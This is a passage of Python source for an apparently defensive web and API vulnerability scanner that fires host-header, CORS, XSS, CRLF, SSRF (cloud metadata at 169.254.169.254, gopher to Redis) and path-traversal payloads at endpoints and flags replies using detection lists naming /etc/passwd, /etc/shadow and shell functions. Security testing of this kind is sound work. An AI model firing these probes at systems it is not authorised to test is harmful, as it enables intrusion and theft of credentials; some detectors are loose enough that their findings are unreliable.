            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)

                # ---------- methode bepalen ---------------------------------
                final_method = (
                    "POST"
                    if method == "auto" and parsed.path.rstrip("/").endswith("posts")
                    else method if method != "auto"
                    else "GET"
                )

                # ---------- request bouwen ----------------------------------
                if final_method == "GET":
                    # - vervang placeholder {id} of eerste cijfer in path
                    attack_url = re.sub(
                        r'(%7B\w+?Id%7D|\d+)',
                        urlparse.quote_plus(payload),
                        test_url,
                        count=1,
                        flags=re.I  
                    )
                    response = self.session.get(
                        attack_url, timeout=self.timeout / 2, allow_redirects=False
                    )
                    requested_url = attack_url

                else:  # POST
                    base_url = test_url.split("?", 1)[0]        # query-string weg
                    response = self.session.post(
                        base_url,
                        data={"input": payload},
                        timeout=self.timeout * 2,
                        allow_redirects=False,
                    )
                    requested_url = (
                        base_url + "?input=" + urlparse.quote_plus(payload)
                    )

                # ---------- evalueren & loggen ------------------------------
                if self._is_injection_successful(response, attack_type):
                    self._log(
                        f"Possible {attack_type.upper()} injection",
                        requested_url,
                        "Critical",
                        payload=payload,
                        response=response,
                    )

                # ---------- extra server-log analyse ------------------------
                self._detect_server_errors(requested_url)

        except Exception as exc:
            self._log(
                "Injection test failed",
                test_url,
                "Low",
                extra={"error": str(exc), "type": attack_type},
            )


# ---------------------------------------------------------------------
# 2.  Header manupulation
# ---------------------------------------------------------------------
    def _test_header_manipulation(self, endpoint: str):
        """Test for header-based vulnerabilities including:
        - Host header attacks
        - HTTP Request Smuggling
        - Header injection
        - Cache poisoning
        - CORS misconfigurations
        - Security header bypasses
        """
        if stop_requested.is_set():
            return

        try:
            domain = urlparse.urlparse(endpoint).netloc
            
            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)
                
                # 1. Host Header Attacks
                host_payloads = [
                    "localhost",
                    "127.0.0.1",
                    "evil.com",
                    domain + ".evil.com",
                    "localhost:8080",
                    "2130706433",  # 127.0.0.1
                    "0x7f000001",  # Hex for 127.0.0.1
                    "0177.0000.0000.0001"  # Octal IP
                ]
                
                for host in host_payloads:
                    headers = {"Host": host}
                    try:
                        r = self.session.get(
                            endpoint, 
                            headers=headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Check for reflection in response
                        if host in r.text:
                            self._log(
                                "Host header reflection vulnerability",
                                endpoint,
                                "Medium",
                                extra={
                                    "host_header": host,
                                    "response_sample": r.text[:200]
                                },
                                response=r
                            )
                        
                        # Check for password reset poisoning
                        if "password" in endpoint.lower() and "reset" in endpoint.lower():
                            if host in r.text or host in r.headers.get("Location", ""):
                                self._log(
                                    "Possible password reset poisoning",
                                    endpoint,
                                    "High",
                                    extra={"host_header": host},
                                    response=r
                                )
                                
                    except Exception as e:
                        self._log(
                            "Host header test failed",
                            endpoint,
                            "Low",
                            extra={"error": str(e), "host": host}
                        )
                
                # 2. HTTP Request Smuggling indicators
                smuggling_headers = [
                    ("Transfer-Encoding", "chunked"),
                    ("Content-Length", "0"),
                    ("Content-Length", "100"),
                    ("Content-Length", "abc")  # Invalid value
                ]
                
                for header, value in smuggling_headers:
                    try:
                        r = self.session.post(
                            endpoint,
                            headers={header: value},
                            data="0\r\n\r\n" if header == "Transfer-Encoding" else "",
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Detect connection anomalies
                        if r.status_code == 400 and "Invalid header" in r.text:
                            self._log(
                                "HTTP Request Smuggling vulnerability",
                                endpoint,
                                "High",
                                extra={
                                    "header": f"{header}: {value}",
                                    "status": r.status_code
                                },
                                response=r
                            )
                            
                    except Exception as e:
                        self._log(
                            "Request smuggling test failed",
                            endpoint,
                            "Medium",
                            extra={"error": str(e), "header": header}
                        )
                
                # 3. Security Header Bypass
                security_headers = {
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Forwarded-Host": "evil.com",
                    "X-Original-URL": "/admin",
                    "X-Rewrite-URL": "/admin",
                    "X-Real-IP": "127.0.0.1"
                }
                
                for header, value in security_headers.items():
                    try:
                        r = self.session.get(
                            endpoint,
                            headers={header: value},
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Check for access control bypass
                        if r.status_code == 200 and "admin" in r.text.lower():
                            self._log(
                                "Possible access control bypass via header",
                                endpoint,
                                "High",
                                extra={"header": f"{header}: {value}"},
                                response=r
                            )
                            
                    except Exception as e:
                        self._log(
                            "Security header test failed",
                            endpoint,
                            "Medium",
                            extra={"error": str(e), "header": header}
                        )
                
                # 4. Header Injection
                injection_payloads = [
                    ("User-Agent", "<script>alert(1)</script>"),
                    ("Referer", "javascript:alert(1)"),
                    ("Origin", "http://evil.com"),
                    ("Cookie", "session=../../../../etc/passwd")
                ]
                
                for header, payload in injection_payloads:
                    try:
                        r = self.session.get(
                            endpoint,
                            headers={header: payload},
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Check for XSS reflection
                        if payload in r.text:
                            self._log(
                                "Header-based XSS vulnerability",
                                endpoint,
                                "High",
                                extra={"header": header, "payload": payload},
                                response=r
                            )
                            
                        # Check for open redirect
                        if "Location" in r.headers and payload in r.headers["Location"]:
                            self._log(
                                "Header-based open redirect",
                                endpoint,
                                "Medium",
                                extra={"header": header, "payload": payload},
                                response=r
                            )
                            
                    except Exception as e:
                        self._log(
                            "Header injection test failed",
                            endpoint,
                            "Medium",
                            extra={"error": str(e), "header": header}
                        )
                
                # 5. CORS Misconfiguration
                cors_payloads = [
                    "https://attacker.com",
                    "null",
                    "http://localhost",
                    "http://127.0.0.1"
                ]
                
                for origin in cors_payloads:
                    try:
                        r = self.session.get(
                            endpoint,
                            headers={"Origin": origin},
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        acao = r.headers.get("Access-Control-Allow-Origin", "")
                        acac = r.headers.get("Access-Control-Allow-Credentials", "")
                        
                        # Check for insecure CORS config
                        if origin in acao or acao == "*":
                            if "true" in acac.lower():
                                self._log(
                                    "Insecure CORS configuration with credentials",
                                    endpoint,
                                    "High",
                                    extra={
                                        "origin": origin,
                                        "acao": acao,
                                        "acac": acac
                                    },
                                    response=r
                                )
                            else:
                                self._log(
                                    "Broad CORS policy",
                                    endpoint,
                                    "Medium",
                                    extra={"origin": origin, "acao": acao},
                                    response=r
                                )
                                
                    except Exception as e:
                        self._log(
                            "CORS test failed",
                            endpoint,
                            "Low",
                            extra={"error": str(e), "origin": origin}
                        )
                        
        except Exception as e:
            self._log(
                "Header manipulation test setup failed",
                endpoint,
                "Medium",
                extra={"error": str(e)}
            )

# ---------------------------------------------------------------------
# 2.  SUCCESS-DETECTOR
# ---------------------------------------------------------------------
    def _is_injection_successful(
        self,
        response: requests.Response,
        attack_type: str,
        *,
        baseline_latency: float = 0.5,
    ) -> bool:
        """
        Returns *True* when there are reasonable indicators of successful injection
        is gelukt:
        - HTTP-500 met SQL/NoSQL/SSTI-keywords
        - 4xx met specifieke foutpatronen
        - gereflecteerde payload
        - time-delay (blind SQL)
        """
        content = response.text.lower()
        status  = response.status_code

        # ---------- algemene 5xx-indicatie ---------------------------------
        if status >= 500:
            return attack_type in {"sql", "nosql", "ssti", "ldap", "xxe"}

        # ---------- SQL-injectie ------------------------------------------
        if attack_type == "sql":
            # 4xx-fouttekst met SQL-keywords
            if status in {400, 422} and any(k in content for k in self.SQL_ERROR_KEYWORDS):
                return True

            if any(k in content for k in self.SQL_ERROR_KEYWORDS):
                return True

            if any(re.search(rgx, content) for rgx in self.SQL_ERROR_REGEX):
                return True

            # time-based blind
            if response.elapsed and response.elapsed.total_seconds() > baseline_latency * 3:
                return True

            return False

        # ---------- NoSQL-injectie ----------------------------------------
        if attack_type == "nosql":
            return any(k in content for k in self.NOSQL_ERROR_KEYWORDS)

        # ---------- XSS ----------------------------------------------------
        if attack_type == "xss":
            # Uitgebreide lijst met XSS-indicatoren
            xss_indicators = [
                "<script>", "</script>", "javascript:", "vbscript:", "data:",
                "alert(", "prompt(", "confirm(", "console.log(", "eval(",
                "onerror=", "onload=", "onmouseover=", "onfocus=", "onclick=",
                "document.cookie", "window.location", "document.domain",
                "innerHTML", "outerHTML", "document.write", "document.writeln",
                "appendChild(", "createElement(", "setAttribute(",
                "fromCharCode(", "String.fromCharCode(", "atob(", "btoa(",
                "fetch(", "XMLHttpRequest(", "import(", "WebSocket(",
                "srcdoc=", "postMessage(", "location.href", "location.replace",
                "history.pushState", "history.replaceState",
                "document.baseURI", "document.URL", "document.documentURI",
                "parent.frames", "top.location", "self.location",
                "document.referrer", "name=", "content=", "url(",
                "expression(", "behavior:", "&#", "&amp;#", "&lt;", "&gt;",
                "&quot;", "&apos;", "&amp;", "%3C", "%3E", "%22", "%27", "%26"
            ]
            
            # Controleer op reflectie van bekende payloads
            payload_reflected = any(
                payload.lower() in content
                for payload in self.INJECTION_PAYLOADS.get('xss', [])
            )
            
            # Controleer op generieke XSS-indicatoren
            generic_detected = any(
                indicator in content for indicator in xss_indicators
            )
            
            # Detecteer specifieke XSS-patronen met regex
            regex_detected = any(
                re.search(pattern, content)
                for pattern in [
                    r"<\s*script[^>]*>",  # <script> tags
                    r"<\s*img[^>]*\s+onerror\s*=",  # onerror handlers
                    r"<\s*svg[^>]*\s+onload\s*=",   # SVG onload
                    r"javascript\s*:",               # javascript: pseudo-protocol
                    r"<\s*iframe[^>]*>",             # iframe tags
                    r"<\s*body[^>]*\s+onload\s*=",   # body onload
                    r"<\s*a[^>]*\s+href\s*=\s*['\"]javascript:",  # javascript in href
                    r"expression\s*\(",              # CSS expressions
                    r"eval\s*\(",                    # eval() calls
                    r"document\.\w+",                # document object access
                    r"window\.\w+",                  # window object access
                ]
            )
            
            return payload_reflected or generic_detected or regex_detected

        # ---------- SSTI ---- Server-Side Template Injection Attacks---------------------------------------------
        if attack_type == "ssti":
            # Uitgebreide lijst met SSTI-indicatoren
            ssti_indicators = [
                # Template syntax
                "{{", "}}", "{%", "%}", "{#", "#}", "<%", "%>", "<%=", "${", "${{", 
                "#{", "*{", "[[", "]]", "[%", "%]", "{{=", "{{.", "<%@", 
                
                # Template engine namen
                "twig", "jinja", "jinja2", "django", "handlebars", "mustache", 
                "ejs", "erb", "velocity", "freemarker", "thymeleaf", "smarty", 
                "tornado", "mako", "cheetah", "chameleon", "genshi", "twirl",
                
                # Foutspecifieke meldingen
                "template error", "template syntax error", "template processing error",
                "template not found", "template rendering error", "undefined template",
                "parse error in template", "template compilation error",
                "unexpected end of template", "unknown template tag",
                "invalid template", "malformed template", "template engine",
                
                # Engine-specifieke foutmeldingen
                "jinja2.exceptions.", "django.template.exceptions.", 
                "twig.error.", "handlebars.exception.", "velocity parse error",
                "freemarker.core.", "org.thymeleaf.", "smarty.compiler.",
                "tornado.template.", "mako.exceptions.", "cheetah.parser.",
                "chameleon.parser.", "genshi.template.", "play.twirl."
            ]
            
            # Controleer op reflectie van bekende payloads
            payload_reflected = any(
                payload.lower() in content
                for payload in self.INJECTION_PAYLOADS.get('ssti', [])
            )
            
            # Controleer op generieke SSTI-indicatoren
            generic_detected = any(
                indicator in content for indicator in ssti_indicators
            )
            
            # Detecteer specifieke SSTI-patronen met regex
            regex_detected = any(
                re.search(pattern, content, re.IGNORECASE)
                for pattern in [
                    r"{%.*?%}",                  # Jinja/Twig tags
                    r"{{.*?}}",                  # Double curly brace syntax
                    r"<%.*?%>",                  # ERB/ASP tags
                    r"\$\{.*?\}",                # ${} syntax
                    r"#\{.*?\}",                 # #{} syntax (Play, Groovy)
                    r"\[\[.*?\]\]",              # [[ ]] syntax (Twig alternative)
                    r"template\s+error",         # Generic template errors
                    r"syntax\s+error\s+in\s+template",  # Syntax errors
                    r"undefined\s+(?:variable|filter|function)",  # Undefined elements
                    r"(?:jinja2|django|twig|smarty|velocity|freemarker|thymeleaf)\..*?exception",  # Engine exceptions
                    r"template\s+processing\s+failed",  # Processing failures
                    r"error\s+in\s+template",    # Generic template errors
                    r"parse\s+error\s+in\s+template",  # Parse errors
                    r"unexpected\s+'.*?'\s+in\s+template",  # Unexpected tokens
                    r"unknown\s+directive\s+'.*?'",  # Unknown directives
                    r"invalid\s+expression\s+in\s+template"  # Invalid expressions
                ]
            )
            
            # Detecteer server-side code execution
            code_execution_detected = any(
                pattern in content
                for pattern in [
                    "root:", "uid=", "gid=", "groups=", "www-data", "apache", 
                    "system(", "popen(", "exec(", "passthru(", "shell_exec(",
                    "process.env", "os.environ", "System.getenv", 
                    "/etc/passwd", "/etc/shadow", "C:\\Windows\\System32"
                ]
            )
            
            return payload_reflected or generic_detected or regex_detected or code_execution_detected

        # ---------- SSRF -------------- Server-Side Request Forgery-------------------------------------
        if attack_type == "ssrf":
            # Uitgebreide lijst met SSRF-indicatoren
            ssrf_indicators = [
                "connection refused", "dns error", "invalid url", "bad gateway",
                "connection timed out", "connection reset", "no route to host",
                "name or service not known", "unknown host", "invalid host",
                "forbidden", "access denied", "internal server error",
                "server returned nothing", "no response", "empty reply from server",
                "connection aborted", "ssl handshake failed", "certificate error",
                "unable to connect", "could not connect", "failed to connect",
                "refused", "timeout", "timed out", "gateway timeout",
                "service unavailable", "bad request", "invalid request",
                
                # Cloud metadata specifieke patronen
                "instance-id", "ami-id", "hostname", "public-ipv4", "local-ipv4",
                "mac address", "security-credentials", "iam/info", "iam/security-credentials",
                "metadata.google.internal", "computeMetadata", "k8s.io", "kubernetes.io",
                "docker", "containerd", "pod", "namespace", "serviceaccount",
                "azure", "aws", "gcp", "cloud", "metadata", "compute", "storage",
                
                # Bestandssysteem indicatoren
                "/etc/passwd", "/etc/shadow", "/etc/hosts", "c:/windows/win.ini",
                "boot.ini", "pagefile.sys", "ntds.dit", "sam", "system",
                
                # Protocol specifieke fouten
                "gopher error", "dict invalid", "ftp error", "smtp error", "ldap error",
                "tftp", "redis", "memcached", "zookeeper", "vnc", "rdp"
            ]
            
            # Cloud metadata detectie - specifieke patronen in content
            cloud_metadata_detected = any(
                pattern in content
                for pattern in [
                    "instance-id", "accountId", "project-id", "zone", "region",
                    "access-key", "secret-key", "token", "expiration",
                    "k8s", "pod", "docker", "container", "namespace",
                    "azure", "aws", "gcp", "metadata", "computeMetadata"
                ]
            )
            
            # Detecteer specifieke metadata response patronen
            metadata_pattern_detected = any(
                re.search(pattern, content, re.IGNORECASE)
                for pattern in [
                    r'"instance-id"\s*:\s*"i-[a-z0-9]+"',  # AWS instance ID
                    r'computeMetadata/v1/',                # GCP metadata
                    r'Microsoft Azure',                    # Azure indicator
                    r'kubernetes.io',                      # Kubernetes
                    r'docker[ /]',                         # Docker
                    r'\{.*?"accessKeyId".*?"secretAccessKey".*?\}',  # AWS credentials
                    r'\{.*?"token".*?"expiration".*?\}',   # Temporary token
                    r'^root:.*?:',                         # /etc/passwd format
                    r'\[blobs\]',                          # Azure storage
                    r'<?xml version="1.0"\s*?>',           # XML responses
                ]
            )
            
            # Detecteer lokale IP-adressen of metadata in response
            local_ip_detected = any(
                re.search(pattern, content)
                for pattern in [
                    r'\b(127\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.',
                    r'\blocalhost\b',
                    r'\bmetadata\.google\.internal\b',
                    r'\b169\.254\.169\.254\b'
                ]
            )
            
            # Detecteer foutcodes die op SSRF duiden
            status_detected = status in {
                # HTTP status codes
                400, 403, 404, 500, 502, 503, 504,
                
                # Minder voorkomende maar relevante codes
                408,  # Request Timeout
                429,  # Too Many Requests
                521,  # Web Server Is Down (Cloudflare)
                523   # Origin Is Unreachable (Cloudflare)
            }
            
            # Combineer alle detectiemethoden
            return (
                cloud_metadata_detected or 
                metadata_pattern_detected or 
                local_ip_detected or 
                status_detected or 
                any(k in content for k in ssrf_indicators)
            )

        # ---------- LDAP ---------------------------------------------------
        if attack_type == "ldap":
            # Expanded list of LDAP error keywords
            ldap_keywords = [
                "ldap", "invalid dn", "bind failed", "ldap_sasl_bind", "ldap_simple_bind",
                "invalid credentials", "size limit exceeded", "time limit exceeded", 
                "admin limit exceeded", "no such object", "alias problem", "invalid syntax",
                "object class violation", "attribute or value exists", "constraint violation",
                "type or value exists", "inappropriate matching", "entry already exists",
                "no such attribute", "undefined attribute type", "inappropriate authentication",
                "insufficient access", "unavailable", "unwilling to perform", "loop detected",
                "naming violation", "non-leaf", "on rdn",
                "no object class mods", "results too large", "server down", "local error",
                "encoding error", "decoding error", "filter error", "user canceled",
                "param error", "no memory", "connect error", "not supported", "control not found",
                "no results returned", "more results to return", "client loop",
                "referral limit exceeded", "referral not found", "canceled", "no such operation",
                "too late", "cannot cancel", "assertion failed", "proxied authorization denied",
                "unknown error"
            ]
            
            # Regular expressions for LDAP error patterns
            ldap_error_patterns = [
                r'LDAP error:?\s*(\d+)',       # LDAP error 49, LDAP error: 49
                r'error code:?\s*(\d+)',        # error code 49, error code: 49
                r'err:?\s*(\d+)',               # err 49, err:49
                r'ldap_.*?error',               # ldap_some_function_error
                r'ldap_err\d+',                 # ldap_err49
                r'\[\w*?LDAP\w*?\]',           # [LDAP Error], [ERROR_LDAP]
                r'\(LDAP_ERR_\d+\)',            # (LDAP_ERR_123)
                r'bind\s+failed',               # bind failed, binding failed
                r'invalid\s+dn',                # invalid dn, invalid distinguished name
                r'invalid\s+credentials',       # invalid credentials
                r'ldap_initialize',             # ldap_initialize failed
                r'ldap_search_ext',             # ldap_search_ext error
                r'ldap_result\s+error',         # ldap_result error
                r'ldap_unbind',                 # ldap_unbind error
                r'ldap_add\s+failed',           # ldap_add failed
                r'ldap_modify\s+failed',        # ldap_modify failed
                r'ldap_delete\s+failed',        # ldap_delete failed
                r'ldap_rename\s+failed',        # ldap_rename failed
                r'ldap_compare\s+failed',       # ldap_compare failed
                r'ldap_sasl_\w+\s+failed',      # ldap_sasl_bind failed, ldap_sasl_interactive failed
                r'ldap_simple_bind\s+failed',   # ldap_simple_bind failed
                r'connection\s+reset\s+by\s+peer',  # connection reset by peer
                r'connection\s+timed\s+out',    # connection timed out
                r'no\s+connection\s+to\s+ldap', # no connection to ldap
                r'ldap_\w+:\s+.*?error',        # ldap_function: some error
                r'error\s+in\s+ldap\s+operation',  # error in ldap operation
                r'ldap_abandon\s+error',        # ldap_abandon error
                r'ldap_msgfree\s+error',        # ldap_msgfree error
                r'ldap_parse_result\s+error',   # ldap_parse_result error
                r'ldap_controls_free\s+error',  # ldap_controls_free error
                r'ldap_control_free\s+error',   # ldap_control_free error
                r'ldap_memfree\s+error',        # ldap_memfree error
                r'ldap_err2string\s+error',     # ldap_err2string error
                r'ldap_get_dn\s+error',         # ldap_get_dn error
                r'ldap_dn2ufn\s+error',         # ldap_dn2ufn error
                r'ldap_explode_dn\s+error',     # ldap_explode_dn error
                r'ldap_explode_rdn\s+error',    # ldap_explode_rdn error
                r'ldap_is_ldap_url\s+error',    # ldap_is_ldap_url error
                r'ldap_url_parse\s+error',      # ldap_url_parse error
                r'ldap_set_option\s+error',     # ldap_set_option error
                r'ldap_get_option\s+error'      # ldap_get_option error
            ]
            
            # Check for any of the keywords in the content (case-insensitive)
            if any(k in content for k in ldap_keywords):
                return True
                
            # Check if any regex matches the content
            if any(re.search(pattern, content, re.IGNORECASE) for pattern in ldap_error_patterns):
                return True
                
            return False

        # ---------- XXE -------XML External Entity injection---------------------------------------------
        if attack_type == "xxe":
            indicators = ("doctype", "entity", "xml parsing error", "root:", "file:", "xmlreader")
            return (
                any(k in content for k in indicators)
                or re.search(r"parser|validation|well-formed", content, re.IGNORECASE)
            )
    #-------------------------------------------------------------------------------------------------------      
        
    def _detect_server_errors(self, endpoint: str):
        #Check server logs for errors after request
        if self.log_monitor:
            errors = self.log_monitor()
            for error in errors:
                if 'sql' in error.lower() and endpoint in error:
                    self._log(
                        'SQL error detected in server logs',
                        endpoint,
                        'High',
                        extra={'error': error}
                    )
    
        
    def _test_basic_security(self, endpoint: str) -> None:
        if stop_requested.is_set():
            return
        try:
            r = self.session.get(endpoint, timeout=self.timeout/2, allow_redirects=False)

            if r.status_code >= 400:
                body = r.text.lower()

                # ---   SQL-indicator? ------------------------------------
                if any(k in body for k in self.SQL_ERROR_KEYWORDS) or \
                any(re.search(p, body) for p in self.SQL_ERROR_REGEX):
                    self._log(
                        "Possible SQL injection",
                        endpoint,
                        "Critical",
                        response=r
                    )

                # ---   NoSQL-indicator? ----------------------------------
                elif any(k in body for k in self.NOSQL_ERROR_KEYWORDS):
                    self._log(
                        "Possible NOSQL injection",
                        endpoint,
                        "Critical",
                        response=r
                    )

                # ---   anders -gewone- 4xx/5xx ---------------------------
                else:
                    self._log(
                        "Basic security fail",
                        endpoint,
                        "Medium",
                        response=r
                    )

        except Exception as exc:
            self._log("Basic security test failed", endpoint, "Low",
                    extra={"error": str(exc)})

    
    
    def _test_crlf_injection(self, endpoint: str):
        """CRLF-injectietests met rate-limiting"""
        if stop_requested.is_set():
            return
        try:
            domain = urlparse.urlparse(endpoint).netloc

            for payload in self.CRLF_PAYLOADS:
                if stop_requested.is_set():
                    break  # gracefully stop on Q request

                try:
                    # Apply rate limiting
                    with self.domain_ratelimits[domain]:
                        time.sleep(self.rate_limit)

                        url = f"{endpoint}?q={payload}"
                        r = self.session.get(url, timeout=self.timeout)

                        # Detectie-logica
                        if "evil" in r.text.lower() or "injected" in r.text.lower():
                            self._log(
                                "CRLF Injection",
                                url,
                                "High",
                                payload=payload,
                                response=r,          # - GEEN response_sample meer
                            )

                except Exception as e:
                    self._log(
                        "CRLF test failed",
                        url,                     # use the actual test URL for context
                        "Medium",
                        extra={"error": str(e), "payload": payload},
                    )

        except Exception as e:
            self._log(
                "CRLF test setup failed",
                endpoint,
                "Medium",
                extra={"error": str(e)},
            )

#-------------------------------SSRF
    def _test_ssrf(self, endpoint: str):
        """Test for Server-Side Request Forgery vulnerabilities"""
        if stop_requested.is_set():
            return
            
        # Payloads that will be injected into vulnerable parameters
        ssrf_payloads = [
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/",
            "http://100.100.100.200/latest/meta-data/",
            
            # Internal network targets
            "http://127.0.0.1:8080/internal",
            "http://192.168.0.1/admin",
            "http://internal-server/secret",
            
            # Out-of-band detection payloads
            f"http://{self.generate_random_id()}.oastify.com",
            "http://burpcollaborator.net",
            
            # Special protocols (server-side handling)
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/INFO",
        ]
        
        # Parameters that might be vulnerable to SSRF
        vulnerable_params = ["url", "image", "path", "request", "endpoint", "redirect"]
        
        try:
            domain = urlparse.urlparse(endpoint).netloc
            
            for param in vulnerable_params:
                for payload in ssrf_payloads:
                    if stop_requested.is_set():
                        return
                    
                    try:
                        # Apply rate limiting
                        with self.domain_ratelimits[domain]:
                            time.sleep(self.rate_limit)
                            
                            # Test GET parameter
                            params = {param: payload}
                            get_response = self.session.get(
                                endpoint, 
                                params=params,
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                            
                            # Test POST body
                            post_response = self.session.post(
                                endpoint,
                                data={param: payload},
                                timeout=self.timeout,
                                allow_redirects=False
                            )
                            
                            # Check if server made the request
                            if self._is_ssrf_successful(get_response, payload):
                                self._log(
                                    "Possible SSRF vulnerability (GET)",
                                    get_response.url,
                                    "High",
                                    payload=payload,
                                    response=get_response,
                                    extra={"parameter": param}
                                )
                                
                            if self._is_ssrf_successful(post_response, payload):
                                self._log(
                                    "Possible SSRF vulnerability (POST)",
                                    post_response.url,
                                    "High",
                                    payload=payload,
                                    response=post_response,
                                    extra={"parameter": param}
                                )
                                
                    except Exception as e:
                        self._log(
                            "SSRF test failed",
                            endpoint,
                            "Medium",
                            extra={"error": str(e), "param": param, "payload": payload}
                        )
                        
        except Exception as e:
            self._log(
                "SSRF test setup failed",
                endpoint,
                "Medium",
                extra={"error": str(e)}
            )

    def _is_ssrf_successful(self, response: requests.Response, payload: str) -> bool:
        """Detect successful SSRF exploitation"""
        content = response.text.lower()
        
        # 1. Detect cloud metadata patterns
        cloud_indicators = [
            "instance-id", "accountid", "project-id", 
            "computeMetadata", "metadata.google.internal"
        ]
        if any(indicator in content for indicator in cloud_indicators):
            return True
            
        # 2. Detect out-of-band interactions
        if payload in content:
            return True
            
        # 3. Detect error messages indicating internal service access
        error_patterns = [
            "connection refused", "connection timed out", 
            "no route to host", "internal server error",
            "dns error", "invalid host"
        ]
        if any(error in content for error in error_patterns):
            return True
            
        # 4. Detect special protocol handling
        if ("gopher" in payload or "dict" in payload) and ("redis" in content or "command" in content):
            return True
            
        return False

    @staticmethod
    def generate_random_id(length=8):
        """Generate random ID for out-of-band detection"""
        
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


# -----------------------------graphql
    
    
        
    def _test_graphql_introspection(self, endpoint: str):
        if stop_requested.is_set():
            return
        try:
            domain = urlparse.urlparse(endpoint).netloc
            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)
                
                # Probeer GraphQL endpoint
                for path in ["/graphql", "/v1/graphql", "/api/graphql"]:
                    url = f"{endpoint.rstrip('/')}{path}"
                    try:
                        r = self.session.post(
                            url,
                            json={"query": self.GRAPHQL_INTROSPECTION_QUERY},
                            timeout=self.timeout
                        )
                        if r.status_code == 200 and "__schema" in r.text:
                            self._log(
                                'GraphQL introspection enabled',
                                endpoint,
                                'Medium',
                                response=r
                            )
                            break
                    except Exception:
                        continue
        except Exception as e:
            self._log(
                'GraphQL test failed',
                endpoint,
                'Low',
                extra={'error': str(e)}
            )
    
    def _test_hpp(self, endpoint: str) -> None:
        """
        HTTP Parameter Pollution-test:
        - Adds each param twice to the query string (?q=1&q=2)
        - Only logs Medium if the server returns 2xx and '1,2' is in the body
        in de body voorkomt.  Anders wordt het Info.
        """
        if stop_requested.is_set():
            return

        try:
            domain = urlparse.urlparse(endpoint).netloc

            for param in self.HPP_PARAMS:
                # bouw URL buiten try zodat url altijd bestaat
                url = f"{endpoint}?{param}=1&{param}=2"

                try:
                    # rate-limit per domain
                    with self.domain_ratelimits[domain]:
                        time.sleep(self.rate_limit)

                        r = self.session.get(
                            url, timeout=self.timeout / 2, allow_redirects=False
                        )

                        body_has_combo = "1,2" in r.text or ",1" in r.text

                        # bepaal severity
                        severity = (
                            "Medium"
                            if (r.status_code < 300 and body_has_combo)
                            else "Info"
                        )

                        # log altijd, maar Info wordt later niet in console geprint
                        self._log(
                            "HPP detected",
                            url,
                            severity,
                            response=r,
                            extra={"parameter": param},
                        )

                except Exception as e:
                    # netwerk/time-out etc. - Low
                    self._log(
                        "HPP test failed",
                        url,
                        "Low",
                        extra={"error": str(e)},
                    )

        except Exception as e:
            self._log(
                "HPP test setup failed",
                endpoint,
                "Low",
                extra={"error": str(e)},
            )

    
    
    def _test_docker_api(self, endpoint: str):
        """Docker API test with proper host extraction"""
        if stop_requested.is_set():
            return
        try:
            host = urlparse.urlparse(endpoint).hostname
            if not host:
                self._log('Docker test invalid host', endpoint, 'Low')
                return

            print(f"[INFO] Docker API test for {host}")

            try:
                # Apply rate limiting
                with self.domain_ratelimits[host]:
                    time.sleep(self.rate_limit)

                    r = self.session.get(f"http://{host}:2375/version", timeout=self.timeout)
                    if r.status_code == 200:
                        self._log(
                            'Docker Remote API open',
                            f"http://{host}:2375/version",
                            'High',
                            response=r    # - volledige Response meegeven
                        )
            except Exception as e:
                self._log(
                    'Docker test failed',
                    f"http://{host}:2375/version",
                    'Medium',
                    extra={'error': str(e)}
                )
        except Exception as e:
            self._log(
                'Docker test setup failed',
                endpoint,
                'Medium',
                extra={'error': str(e)}
            )


    def _test_kubernetes_api(self, endpoint: str):
        """Kubernetes API test with proper host extraction"""
        if stop_requested.is_set():
            return
        try:
            host = urlparse.urlparse(endpoint).hostname
            if not host:
                self._log('Kubernetes test invalid host', endpoint, 'Low')
                return

            print(f"[INFO] Kubernetes API test for {host}")

            for port in [6443, 2379]:
                if stop_requested.is_set():
                    break

                try:
                    # Apply rate limiting
                    with self.domain_ratelimits[host]:
                        time.sleep(self.rate_limit)

                        url = f"https://{host}:{port}/version"
                        r = self.session.get(url, timeout=self.timeout, verify=False)
                        if r.status_code == 200:
                            self._log(
                                'Kubernetes API open',
                                url,
                                'High',
                                response=r    # - volledige Response meegeven
                            )
                except Exception as e:
                    self._log(
                        'Kubernetes test failed',
                        endpoint,
                        'Medium',
                        extra={'error': str(e)}
                    )

        except Exception as e:
            self._log(
                'Kubernetes test setup failed',
                endpoint,
                'Medium',
                extra={'error': str(e)}
            )


    

    def _test_sensitive_data_exposure(self, endpoint: str):
        """Sensitive data exposure test"""
        if stop_requested.is_set():
            return
        try:
            domain = urlparse.urlparse(endpoint).netloc
            with self.domain_ratelimits[domain]:
                time.sleep(self.rate_limit)

                # CORRECTIE: Use correct URL construction
                url = f"{self.base_url}/api/v1/config" if endpoint == self.base_url else f"{endpoint}/api/v1/config"
                
                r = self.session.get(url, timeout=self.timeout)
                content = r.text.lower()
                for term in ['password', 'secret', 'token', 'key', 'credential']:
                    if term in content:
                        self._log(
                            'Sensitive data exposure',
                            url,
                            'High',
                            response=r
                        )
                        break
        except Exception as e:
            # CORRECTIE: Log status_code 0 on errors
            self._log(
                'Sensitive data test failed',
                endpoint,
                'Medium',
                extra={'error': str(e), 'status_code': 0}
            )


    def test_endpoints(self, endpoints: List[str]) -> List[Issue]:
        MAX_WORKERS = min(32, (os.cpu_count() or 1) * 4)
        #MAX_WORKERS = max(8, min(64, len(endpoints) * 2)) for more speed
        print(f"{Fore.CYAN}[INFO] Starting full scan with {MAX_WORKERS} workers{Style.RESET_ALL}")

        # Reset stop event for a new scan
        global stop_requested
        stop_requested.clear()

        # Pre-scan: quick reachability check
        reachable_endpoints = []
        with tqdm(total=len(endpoints), desc="Pre-scanning") as pbar:
            with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pre_executor:
                future_to_ep = {
